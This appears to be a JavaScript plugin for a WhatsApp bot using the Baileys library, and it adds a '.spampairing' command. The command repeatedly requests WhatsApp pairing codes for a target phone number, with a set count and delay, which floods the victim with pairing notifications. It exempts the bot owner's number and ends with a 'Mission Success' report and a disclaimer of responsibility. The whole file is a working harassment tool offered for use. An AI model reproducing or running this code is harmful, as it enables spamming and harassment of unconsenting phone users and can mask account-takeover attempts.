import pino from "pino";
import pkg from "@whiskeysockets/baileys";
const { useMultiFileAuthState, PHONENUMBER_MCC } = pkg;
import { makeWASocket } from "../lib/simple.js";

const handler = async (m, { text }) => {
    const { state } = await useMultiFileAuthState("tmp");

    const config = {
        printQRInTerminal: false,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: state,
    };

    global.lilychanSockets = makeWASocket(config);

    const [num, jum, slep] = text.split(' ');
    const jumlah = parseInt(jum) || 1; // Default to 1 if not provided
    const jeda = parseInt(slep) || 2000; // Default to 2000 ms if not provided

    if (!num) return m.reply(`*Enter The Number Target!*\nExample Code: .spampairing nomor jumlah jeda\nExample: .spampairing 628xxx 10 2\n\n*[ N O T E ]*\nUntuk jeda, *1000* = 1 detik`);
    if (jeda < 1000) return m.reply("Waktu jeda minimal 1000!");
    if (num.includes('6281541177589')) return m.reply("Jangan Spam Ke Ownerku Paman!!!");

    try {
        await m.reply("_Sending Request...");
        await sleep(jeda);
        let phoneNumber = num.replace(/[^0-9]/g, '');

        if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
            return m.reply("Nomor tidak valid.");
        }

        for (let i = 0; i < jumlah; i++) {
            await lilychanSockets.requestPairingCode(phoneNumber);
            await sleep(jeda);
        }

        await m.reply(`*Mission Success...*\n\n*• Target:* ${phoneNumber}\n*• Jumlah:* ${jumlah}\n*• Jeda:* ${jeda} ms\n\n*[ N O T E ]*\nSegala Resiko Ditanggung Oleh Pengguna,\nJangan Disalah Gunakan Yaa Fiturnya!`);
    } catch (error) {
        m.reply(String(error));
    }
};

handler.help = ["spampairing *[tag or number target]*"];
handler.command = /^(spampairing)$/i;

export default handler;

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));